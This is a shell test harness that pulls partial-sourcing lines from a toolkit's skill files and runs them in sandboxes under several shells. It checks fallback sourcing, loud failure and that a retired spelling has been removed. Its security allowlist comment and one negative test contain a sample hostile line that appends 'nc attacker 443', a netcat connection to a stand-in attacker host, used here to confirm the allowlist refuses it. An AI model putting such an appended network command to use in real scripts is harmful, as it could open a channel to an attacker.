#!/bin/sh
# partials/tests/source-guard.test.sh — REQ-610 ADR-5.
#
# Proves that the partial-sourcing lines the repository ACTUALLY CONTAINS survive
# every shell run.sh drives. The harness hardcodes no spelling: it extracts every
# distinct sourcing line from the real corpus (*/SKILL.md, agents/*.md,
# proceed/phase*.md, and the non-comment lines of partials/*.sh — the last is what
# covers emit-step-telemetry.sh's live self-source) and executes each one verbatim
# in a sandbox, under the shell run.sh hands it via $ADLC_TEST_SHELL.
#
# A harness that copied the spelling would prove the spelling, not the fences. This
# one goes red the moment the corpus says something the executing shell cannot run.
#
# Cases, per extracted line:
#   (a) repo-local copy absent          -> canonical marker printed AND execution
#                                          continues past the source line   (BR-1)
#   (b) repo-local present, ends `false` -> repo-local marker only, canonical NOT
#                                          sourced on top of it             (BR-2)
#   (c) both copies absent               -> stderr non-empty and names the path,
#                                          never swallowed by a redirect    (BR-4)
# Plus, once:
#   (d) the executable `!`-macro form (`sh A || sh B`) — the benign control: `sh`
#       is an ordinary command, so its failure is never fatal               (BR-7)
#   vacuous_extraction_fails — a zero-line extraction is a FAILURE, not a silent
#       green run; a rotted regex must not pass                             (BR-12)
#
# The shell UNDER TEST is $ADLC_TEST_SHELL (default /bin/sh) — the shell that
# runs this harness file is not the one the corpus lines are executed with. So:
#   ADLC_TEST_SHELL=bash    sh partials/tests/source-guard.test.sh
#   ADLC_TEST_SHELL=zsh     sh partials/tests/source-guard.test.sh
#   ADLC_TEST_SHELL=/bin/sh sh partials/tests/source-guard.test.sh
# or via the wrapper, which sets it for each shell:  sh partials/tests/run.sh
#
# Exits 0 iff every case passes; prints one PASS:/FAIL: line per case.

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
PARTIALS=$(CDPATH= cd -- "$HERE/.." && pwd)
ROOT=$(CDPATH= cd -- "$PARTIALS/.." && pwd)

# The shell under test. run.sh sets it; a bare invocation defaults to /bin/sh,
# which is the shell the guard exists for.
SUT=${ADLC_TEST_SHELL:-/bin/sh}

FAILS=0
pass() { echo "PASS: $1"; }
fail() { echo "FAIL: $1"; FAILS=$((FAILS + 1)); }
check() { # check <desc> <expected> <actual>
  if [ "$2" = "$3" ]; then pass "$1 (= $3)"; else fail "$1 (expected '$2', got '$3')"; fi
}

# LESSON-441's full-path template (BSD and GNU agree on it), single arm, and the
# result is validated BEFORE any `rm -rf "$SANDBOX/..."` can be derived from it:
# an empty SANDBOX would turn those into `rm -rf /a`.
SANDBOX=$(mktemp -d "${TMPDIR:-/tmp}/adlc-srcguard.XXXXXX") || { echo "source-guard.test.sh: mktemp failed" >&2; exit 1; }
[ -n "$SANDBOX" ] && [ -d "$SANDBOX" ] || { echo "source-guard.test.sh: sandbox path invalid" >&2; exit 1; }
trap 'rm -rf "$SANDBOX"' EXIT INT TERM

OUT="$SANDBOX/out"
ERR="$SANDBOX/err"

# ===========================================================================
# Corpus extraction (ADR-5). Split-free: the lines are carried through files
# and `while IFS= read -r`, never through an unquoted expansion (LESSON-329).
# ===========================================================================
# A line is a sourcing line when it starts with one of these constructs and
# names a partial. `else`/`elif` are statement positions too (a `. x` after
# `else` is as live as one after `then`); the name class admits `_` and
# uppercase so an unconventionally named partial cannot slip past.
SRC_LINE_RE='^(\. |source |\[ -f |if \[ -f |elif \[ -f |else \. ).*partials/[A-Za-z0-9_-]+\.sh'

# File lists come from `find`, never from globs: zsh aborts the WHOLE command
# on one unmatched glob (LESSON-335 #3), so a single missing family would have
# silently emptied the corpus — and, in case (e), an empty corpus yields the
# expected zero hits. Each leg is its own function so the partials leg can be
# proven to contribute independently of the markdown leg.
extract_markdown_leg() { # extract_markdown_leg <root>
  { find "$1" -maxdepth 2 -name SKILL.md -type f 2>/dev/null
    find "$1/agents" -maxdepth 1 -name '*.md' -type f 2>/dev/null
    find "$1/proceed" -maxdepth 1 -name 'phase*.md' -type f 2>/dev/null; } \
  | sort | while IFS= read -r f; do cat "$f"; done
}
extract_partials_leg() { # extract_partials_leg <root> — non-comment lines of partials/*.sh
  find "$1/partials" -maxdepth 1 -name '*.sh' -type f 2>/dev/null | sort \
  | while IFS= read -r f; do grep -hv '^[[:space:]]*#' "$f"; done
}
extract() { # extract <root> — distinct sourcing lines, leading whitespace stripped
  { extract_markdown_leg "$1"; extract_partials_leg "$1"; } \
  | sed 's/^[[:space:]]*//' | grep -E "$SRC_LINE_RE" | sort -u
}

# Execution allowlist (REQ-610 security review). Extraction is a loose prefix
# match over markdown, and every extracted line is handed to a real shell with
# only HOME and cwd sandboxed — uid, PATH, network and the absolute filesystem
# are the developer's own. So a line reaches a shell ONLY if every
# whitespace-separated token is a sourcing construct: the guard keywords, `.`,
# `source`, `sh`, the two convention paths, `2>/dev/null`, and list operators.
# `[ -f .adlc/partials/x.sh ] || nc attacker 443` extracts, but `nc` is not a
# token here, so it is REFUSED with a FAIL and never executed. The lint's
# unguarded-source rule is deliberately NOT the gate for this — it only sees
# dot-sources of convention paths, not arbitrary trailing commands.
TOKEN_RE='^(if|then|elif|else|fi|\.|source|sh|\[|-f|\]|\];|;|\|\||&&|2>/dev/null|(\.adlc/partials/|~/\.claude/skills/partials/)[A-Za-z0-9_-]+\.sh;?)$'
conforms() { # conforms <line> — 0 iff every token is allowlisted
  if printf '%s\n' "$1" | tr '\t' ' ' | tr -s ' ' '\n' | grep -vqE "$TOKEN_RE"; then
    return 1
  fi
  return 0
}

names_of() { # names_of <line> — the distinct <name>s the line references
  printf '%s\n' "$1" \
    | grep -oE 'partials/[A-Za-z0-9_-]+\.sh' \
    | sed 's#partials/##; s#\.sh$##' | sort -u
}

# --- sandbox construction ---------------------------------------------------

mk_fakehome() { # mk_fakehome <homedir> <line> — canonical copy per referenced name
  mkdir -p "$1/.claude/skills/partials"
  names_of "$2" | while IFS= read -r n; do
    printf 'printf "CANON:%s\\n"\n' "$n" > "$1/.claude/skills/partials/$n.sh"
  done
}

mk_repo_local() { # mk_repo_local <workdir> <line> — vendored copy whose LAST
                  # command returns non-zero, which is what `A && . A || . B`
                  # and `. A || . B` both get wrong (BR-2).
  mkdir -p "$1/.adlc/partials"
  names_of "$2" | while IFS= read -r n; do
    printf 'printf "LOCAL:%s\\n"\nfalse\n' "$n" > "$1/.adlc/partials/$n.sh"
  done
}

run_line() { # run_line <line> <workdir> <fakehome>
  # The line goes into a temp FILE, never into `-c`: a file sidesteps every
  # quoting difference between the four shells and lets zsh run it as a script
  # rather than as history-expanded command text (LESSON-436). `AFTER` sits on
  # its own line so a trailing comment in a fence cannot swallow the sentinel.
  printf '%s\nprintf "AFTER\\n"\n' "$1" > "$SANDBOX/run.sh"
  ( cd "$2" && HOME="$3" "$SUT" "$SANDBOX/run.sh" ) >"$OUT" 2>"$ERR"
}

# --- observation helpers ----------------------------------------------------
# Each prints `ok` or `missing:<names>` so a failure names the partial that
# went missing rather than reporting a bare boolean.

markers_state() { # markers_state <file> <line> <prefix> — looks for <prefix>:<name>
  miss=$(names_of "$2" | while IFS= read -r n; do
      grep -qF "$3:$n" "$1" || printf '%s\n' "$n"
    done | tr '\n' ',' | sed 's/,$//')
  if [ -n "$miss" ]; then printf 'missing:%s' "$miss"; else printf 'ok'; fi
}

paths_state() { # paths_state <file> <line> — looks for <name>.sh (BR-4 diagnosability)
  miss=$(names_of "$2" | while IFS= read -r n; do
      grep -qF "$n.sh" "$1" || printf '%s\n' "$n"
    done | tr '\n' ',' | sed 's/,$//')
  if [ -n "$miss" ]; then printf 'missing:%s' "$miss"; else printf 'ok'; fi
}

after_state() { # after_state <file>
  if grep -qF 'AFTER' "$1"; then printf 'ok'; else printf 'missing'; fi
}

canon_seen_state() { # canon_seen_state <file>
  if grep -qF 'CANON:' "$1"; then printf 'present'; else printf 'absent'; fi
}

nonempty_state() { # nonempty_state <file>
  if [ -s "$1" ]; then printf 'nonempty'; else printf 'empty'; fi
}

# ===========================================================================
# Cases
# ===========================================================================

case_a_fallback_sourced() { # <line> — repo-local absent: canonical sourced, run continues
  work="$SANDBOX/a/work"; fake_home="$SANDBOX/a/home"
  rm -rf "$SANDBOX/a"; mkdir -p "$work"
  mk_fakehome "$fake_home" "$1"
  run_line "$1" "$work" "$fake_home"
  check "case_a_fallback_sourced: $1" "canon=ok after=ok" \
    "canon=$(markers_state "$OUT" "$1" CANON) after=$(after_state "$OUT")"
}

case_b_local_only() { # <line> — repo-local present and ending in `false`: exactly one copy
  work="$SANDBOX/b/work"; fake_home="$SANDBOX/b/home"
  rm -rf "$SANDBOX/b"; mkdir -p "$work"
  mk_fakehome "$fake_home" "$1"
  mk_repo_local "$work" "$1"
  run_line "$1" "$work" "$fake_home"
  check "case_b_local_only: $1" "repo_local=ok canon=absent after=ok" \
    "repo_local=$(markers_state "$OUT" "$1" LOCAL) canon=$(canon_seen_state "$OUT") after=$(after_state "$OUT")"
}

case_c_loud_when_both_absent() { # <line> — nothing to source anywhere: stay loud
  work="$SANDBOX/c/work"; fake_home="$SANDBOX/c/no-such-home"
  rm -rf "$SANDBOX/c"; mkdir -p "$work"
  run_line "$1" "$work" "$fake_home"
  check "case_c_loud_when_both_absent: $1" "stderr=nonempty names=ok" \
    "stderr=$(nonempty_state "$ERR") names=$(paths_state "$ERR" "$1")"
}

case_d_macro_form_continues() { # the `!`-macro executable form — benign control (BR-7)
  MACRO='sh .adlc/partials/ethos-include.sh 2>/dev/null || sh ~/.claude/skills/partials/ethos-include.sh'
  work="$SANDBOX/d/work"; fake_home="$SANDBOX/d/home"
  rm -rf "$SANDBOX/d"; mkdir -p "$work"
  mk_fakehome "$fake_home" "$MACRO"
  run_line "$MACRO" "$work" "$fake_home"
  check "case_d_macro_form_continues: $MACRO" "canon=ok after=ok" \
    "canon=$(markers_state "$OUT" "$MACRO" CANON) after=$(after_state "$OUT")"
}

# ===========================================================================
# 1. Extraction, and the vacuous-run guard (BR-12 / REQ-595 BR-5 posture)
# ===========================================================================
LINES_FILE="$SANDBOX/lines.txt"
extract "$ROOT" > "$LINES_FILE"
NLINES=$(grep -c . "$LINES_FILE")

if [ "$NLINES" -eq 0 ]; then
  # A rotted regex, a moved file family, or a bad $ROOT would otherwise make this
  # harness exit 0 having tested nothing at all.
  fail "vacuous_extraction_fails: extraction from $(basename "$ROOT") yielded zero partial-sourcing lines"
else
  pass "vacuous_extraction_fails: extraction yielded $NLINES distinct line(s)"
fi
# The guard's failing branch is driven, not just written: an empty root must
# come back as zero lines (the exact input that branch fires on), otherwise the
# guard could never fail and BR-12's obligation would be dead code.
mkdir -p "$SANDBOX/emptyroot"
empty_n=$(extract "$SANDBOX/emptyroot" | grep -c .)
check "vacuous_extraction_guard_fires: an empty root yields zero lines (the fail-branch input)" "0" "$empty_n"

# The self-source inside partials/*.sh is the reason the extraction reads more than
# the fence-bearing markdown. The live line in emit-step-telemetry.sh sources
# delegate-tools-path.sh, and the SKILL.md fences carry byte-identical text, so a
# grep over the merged, deduplicated set would pass even if the partials leg were
# dropped (the correctness review proved it by deleting the leg). Two checks that
# the merged set cannot satisfy:
#   1. the partials leg ALONE, run through the same filter, yields that line;
#   2. provenance — extract() over a synthetic root holding ONLY a partials/*.sh
#      returns the distinct line planted there and not its comment.
PARTIAL_LEG=$(extract_partials_leg "$ROOT" | sed 's/^[[:space:]]*//' | grep -E "$SRC_LINE_RE" \
  | grep -F 'partials/delegate-tools-path.sh' | head -1)
if [ -n "$PARTIAL_LEG" ]; then
  pass "emit_step_telemetry_self_source_extracted: partials/*.sh leg alone yields '$PARTIAL_LEG'"
else
  fail "emit_step_telemetry_self_source_extracted: the partials/*.sh leg alone did not yield the delegate-tools-path self-source"
fi
PROV="$SANDBOX/prov"; mkdir -p "$PROV/partials"
printf '#!/bin/sh\n# comment: . .adlc/partials/not-a-source.sh\nif [ -f .adlc/partials/provenance-probe.sh ]; then . .adlc/partials/provenance-probe.sh; else . ~/.claude/skills/partials/provenance-probe.sh; fi\n' > "$PROV/partials/probe.sh"
prov_out=$(extract "$PROV")
if printf '%s\n' "$prov_out" | grep -qF 'partials/provenance-probe.sh' \
   && ! printf '%s\n' "$prov_out" | grep -qF 'not-a-source'; then
  pass "partials_leg_provenance: extract() over a partials-only root returns the planted line and skips its comment"
else
  fail "partials_leg_provenance: extract() over a partials-only root returned '$prov_out'"
fi

# The allowlist itself is tested in both directions before anything runs: a
# canonical line must conform (or the whole harness would refuse the corpus),
# and a line carrying a foreign command after a sourcing construct must not.
if conforms 'if [ -f .adlc/partials/forge.sh ]; then . .adlc/partials/forge.sh; else . ~/.claude/skills/partials/forge.sh; fi'; then
  pass "allowlist_accepts_canonical: the canonical spelling conforms"
else
  fail "allowlist_accepts_canonical: the canonical spelling was refused — TOKEN_RE is wrong"
fi
if conforms '[ -f .adlc/partials/forge.sh ] || nc attacker 443'; then
  fail "allowlist_refuses_foreign_command: a line with a non-sourcing command conformed"
else
  pass "allowlist_refuses_foreign_command: non-sourcing command refused"
fi

# ===========================================================================
# 2. Every extracted line, under $SUT, in cases (a)-(c)
# ===========================================================================
while IFS= read -r line; do
  [ -n "$line" ] || continue
  if ! conforms "$line"; then
    fail "refused_nonconforming_line: not a pure sourcing construct, NOT executed: $line"
    continue
  fi
  case_a_fallback_sourced "$line"
  case_b_local_only "$line"
  case_c_loud_when_both_absent "$line"
done < "$LINES_FILE"

# ===========================================================================
# 3. The benign path — the executable macro form is not affected
# ===========================================================================
case_d_macro_form_continues

# ===========================================================================
# 4. (e) The retired spelling is gone from everything the toolkit DISTRIBUTES,
#    and the canonical spelling is what conventions.md teaches (BR-8, AC-6, AC-7).
#    Historical records (.adlc/specs, .adlc/knowledge, .adlc/bugs, CHANGELOG) are
#    deliberately outside this grep — they are not rewritten (BR-8).
# ===========================================================================
RETIRED='2>/dev/null || . ~/.claude/skills/partials/'
CANON_SPELLING='if [ -f .adlc/partials/<name>.sh ]; then . .adlc/partials/<name>.sh; else . ~/.claude/skills/partials/<name>.sh; fi'
surface_files() { # the distribution surface — find, not globs (zsh unmatched-glob abort)
  { find "$ROOT" -maxdepth 2 -name SKILL.md -type f
    find "$ROOT/agents" "$ROOT/partials" "$ROOT/proceed" "$ROOT/templates" "$ROOT/workflows" \
         "$ROOT/.adlc/context" -maxdepth 1 -type f
    printf '%s\n' "$ROOT/README.md" "$ROOT/tools/lint-skills/README.md"; } 2>/dev/null
}
# Positive control first: an expected value of zero hits is only evidence when
# the corpus it was counted over is demonstrably non-empty.
surface_lines=$(surface_files | while IFS= read -r f; do cat "$f" 2>/dev/null; done | wc -l | tr -d ' ')
if [ "${surface_lines:-0}" -ge 5000 ]; then
  pass "case_e_surface_nonvacuous: distribution surface is $surface_lines lines (floor 5000)"
else
  fail "case_e_surface_nonvacuous: distribution surface is only ${surface_lines:-0} lines — a family went missing"
fi
count_retired() { # count_retired <file>... — total retired-literal hits across the files given on stdin
  while IFS= read -r f; do grep -cF "$RETIRED" "$f" 2>/dev/null || true; done | awk '{s+=$1} END{print s+0}'
}
# Positive control (LESSON-602): the counter must be able to fire before its
# zero on the real surface means anything.
printf 'prose: `. .adlc/partials/x.sh 2>/dev/null || . ~/.claude/skills/partials/x.sh`\n' > "$SANDBOX/retired-probe.md"
probe_hits=$(printf '%s\n' "$SANDBOX/retired-probe.md" | count_retired)
check "case_e_counter_fires_on_probe: a planted retired line is counted" "1" "$probe_hits"
hits=$(surface_files | count_retired)
check "case_e_retired_literal_absent_from_distribution: '$RETIRED' hits on the distribution surface" "0" "$hits"
if grep -qF "$CANON_SPELLING" "$ROOT/.adlc/context/conventions.md"; then
  pass "case_e_conventions_carry_canonical_spelling: conventions.md teaches the guarded form"
else
  fail "case_e_conventions_carry_canonical_spelling: conventions.md does not contain the canonical spelling verbatim"
fi

# ===========================================================================
# 5. (f) The 2026-09-01 reproduction: the /architect Step 5 footprint fence, run
#    under $SUT from a tree with no .adlc/ and no pipeline-state.json, must get PAST
#    its source line and reach its own standalone-run guard (AC-8). forge.sh is a
#    fake that defines the two adapter functions the block would call if it ever
#    got that far; it never does — the guard exits 0 first.
#    This is the ONE place a whole fence body is executed rather than an
#    allowlisted sourcing line. It is the fence /architect runs in production with
#    the developer's real HOME and cwd, so a hostile change to it is a hostile
#    change to the skill itself; here it runs with both sandboxed and no
#    pipeline-state.json, which is strictly less exposure than a normal run.
# ===========================================================================
case_f_architect_step5_under_sh() {
  work="$SANDBOX/f/work"; fake_home="$SANDBOX/f/home"
  rm -rf "$SANDBOX/f"; mkdir -p "$work" "$fake_home/.claude/skills/partials"
  printf 'adlc_forge_pr_view() { :; }\nadlc_forge_pr_edit() { :; }\n' > "$fake_home/.claude/skills/partials/forge.sh"
  # First ```sh fence after the "### Step 5" heading, body only.
  awk '/^### Step 5/{f=1} f' "$ROOT/architect/SKILL.md" \
    | awk '/^```sh$/{c++; next} c==1 && /^```$/{exit} c==1' > "$SANDBOX/step5.sh"
  if [ ! -s "$SANDBOX/step5.sh" ]; then
    fail "case_f_architect_step5_under_sh: could not extract the Step 5 fence from architect/SKILL.md"
    return
  fi
  ( cd "$work" && REQ=REQ-000 HOME="$fake_home" "$SUT" "$SANDBOX/step5.sh" ) >"$OUT" 2>"$ERR"; rc=$?
  if grep -qF 'standalone run, skipping footprint publish' "$OUT" && [ "$rc" -eq 0 ]; then
    pass "case_f_architect_step5_under_sh: fence ran past its source line under $SUT (rc=0, standalone guard reached)"
  else
    # Sandbox paths are scrubbed from the captured output before it is printed
    # (BUG-054 class: absolute temp paths in transcripts).
    fail "case_f_architect_step5_under_sh: expected the standalone-run line and rc=0 under $SUT, got rc=$rc stdout='$(sed "s#$SANDBOX#<sandbox>#g" "$OUT")' stderr='$(sed "s#$SANDBOX#<sandbox>#g" "$ERR")'"
  fi
}
case_f_architect_step5_under_sh

# ===========================================================================
# 6. (g) No partial dot-sources another partial without a [ -f ] guard on the
#    SAME line. The line-anchored extraction above cannot see a multi-line
#    `. A || . B || . C` chain (id-recheck.sh carried one, on continuation lines
#    beginning with `||`, and dash found it before any reviewer did — REQ-610).
#    A dot-source of a partials path is compliant only when the line also tests
#    `[ -f ` before it; anything else is a finding. This is a COARSER same-line
#    check than the lint's unguarded-source rule (it does not verify the guarded
#    and sourced names agree) — the lint is authoritative; this keeps run.sh
#    self-sufficient. Run from $ROOT so the labels are repo-relative without
#    interpolating a path into a regex.
# ===========================================================================
unguarded_in() { # unguarded_in <root> — unguarded partial-to-partial dot-sources under <root>/partials, repo-relative labels
  ( cd "$1" && grep -nHE '(^|[;&|{(]|then|else|elif|do)[[:space:]]*(\.|source)[[:space:]]+[^[:space:]]*partials/[A-Za-z0-9_-]+\.sh' partials/*.sh 2>/dev/null \
    | grep -v ':[0-9][0-9]*:[[:space:]]*#' \
    | grep -vE '\[ -f [^]]*partials/[A-Za-z0-9_-]+\.sh \].*(\.|source) [^[:space:]]*partials/' )
}
# Positive control (LESSON-602): the exact chain shape id-recheck.sh carried,
# planted in a sandbox root, must be found — otherwise the empty result on the
# real tree proves nothing.
mkdir -p "$SANDBOX/badroot/partials"
printf '#!/bin/sh\n# . .adlc/partials/comment-only.sh\nf() {\n  { [ -n "$D" ] && . "$D/id-alloc.sh"; } \\\n    || . .adlc/partials/id-alloc.sh 2>/dev/null \\\n    || . ~/.claude/skills/partials/id-alloc.sh 2>/dev/null\n}\n' > "$SANDBOX/badroot/partials/bad.sh"
bad_hits=$(unguarded_in "$SANDBOX/badroot" | grep -c .)
check "case_g_detector_fires_on_planted_chain: the id-recheck-shaped chain is found (2 continuation lines, comment skipped)" "2" "$bad_hits"
unguarded=$(unguarded_in "$ROOT")
if [ -z "$unguarded" ]; then
  pass "case_g_partials_have_no_unguarded_dot_source: every partial-to-partial source is [ -f ]-guarded"
else
  fail "case_g_partials_have_no_unguarded_dot_source: unguarded dot-source(s) in partials: $(printf '%s' "$unguarded" | tr '\n' ' ')"
fi

# ===========================================================================
if [ "$FAILS" -eq 0 ]; then
  echo "source-guard.test.sh: ALL CASES PASS ($SUT)"
  exit 0
fi
echo "source-guard.test.sh: $FAILS CASE(S) FAILED ($SUT)"
exit 1
